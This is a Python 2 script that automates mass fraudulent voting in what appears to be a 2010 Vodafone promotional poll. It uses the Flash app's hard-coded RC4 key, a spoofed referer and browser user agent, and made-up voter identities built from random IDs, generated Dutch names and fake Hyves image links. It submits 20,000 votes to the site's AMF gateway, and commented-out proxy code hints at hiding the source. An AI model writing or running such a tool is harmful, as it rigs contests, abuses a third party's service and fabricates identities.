#!/usr/bin/env python

import logging, binascii, rc4, random, hashlib, names, time, urllib2
from pyamf.remoting.client import RemotingService

#proxy_handler = urllib2.ProxyHandler({'http': 'http://www.dezebestandnietdushijgaatopzijnbek.com:3128/'})
#opener = urllib2.build_opener(proxy_handler)
#urllib2.install_opener(opener)

key = 'wodrocks'

def doVote(data):
	appReferer = 'http://vodafone.egotribe.nl/WOD2010_Loader01.swf?random='+str(random.randint(10000, 99999))
	userAgent = 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.127 Safari/533.4'

	logging.basicConfig(
	    level=logging.DEBUG,
	    format='%(asctime)s %(levelname)-5.5s [%(name)s] %(message)s'
	)

	try:
		gw = RemotingService('http://flashservices.egotribe.nl/gateway.php', referer=appReferer, logger=logging, user_agent=userAgent)
		gw.addHTTPHeader("Accept-encoding", "gzip")
		service = gw.getService('vodafoneGadget')
		print service.saveVote(data)
	except:
		pass

def randUserID():
	x = str(random.randint(10000, 999999));
	return hashlib.sha224(x).hexdigest()[:16]

def genHyvesURL():
	IPS = [ '94.100.114.165', '94.100.116.140', '94.100.114.70', '94.100.118.209', '94.100.120.1', '94.100.118.67', '94.100.114.22', '94.100.116.45', '94.100.124.174', '94.100.118.216', '94.100.124.38', '94.100.118.67', '94.100.118.109', '94.100.118.246', '94.100.114.79' ]
	dir = str(random.randint(10000, 99999))
	sub = random.randint(10000, 50000)
	rest = sub % 100
	rand = hashlib.sha224(str(rest)).hexdigest()[:4]

	url  = "http://"
	url += IPS[random.randint(0, len(IPS))-1]+"/"
	url += dir+"00001-"+dir+"50000/"
	url += dir+str(sub-rest+1)+"-"+dir+str((sub-rest)+100)+"/"
	url += dir+str(sub)+"_14_"+rand+".jpeg"

	return url

def generateUserInfo():
	UIDs = [ 'b3cdf321c6c019d3', 'efbbf92b7dab2f3e', 'f4953a7d462d4bd8', 'c9bed70e4525ef9a', 'a7a35424b016e22a', '272bf47d9ceeb3d4', '1f192d1c33738a7a', 'f10a9e9c7ed0b0f9', 'a593ed097304959f', 'a0cc2284c03d7cc3' ]
	data =  UIDs[random.randint(0, len(UIDs))-1]+';'
	data += randUserID()+';'
	data += names.MName(3, "voor").New()+";"
	data += names.MName(3, "achter").New()+";"
	data += genHyvesURL()+";"

	return data

def hex0rcrypt(data, key):
	crypt = rc4.rc4crypt(data, key)
	return "z"+binascii.hexlify(crypt)


for i in range(0, 20000):
	data = generateUserInfo()
	hex = hex0rcrypt(data, key)
	hex = 'z8f1318468949a919a8663a68dcb613b683d0b98a443ca9c910071f259b8383d0991b9c9a5fb157cdfcc08bd87fe4baba37e06f9eab6e909b4e9c0c80c94be1dbbd007369b7cbd6daaf983b61e408869c1d1d6e863aa2bc0dfe91f71d30946532c12a8db9bcc6498e493350c6e9ea9a1421a12233d89d6f25c62e798c25aa610558c7c47a1dea7841b41946c905e7'
	doVote(hex)
	time.sleep(0.5)
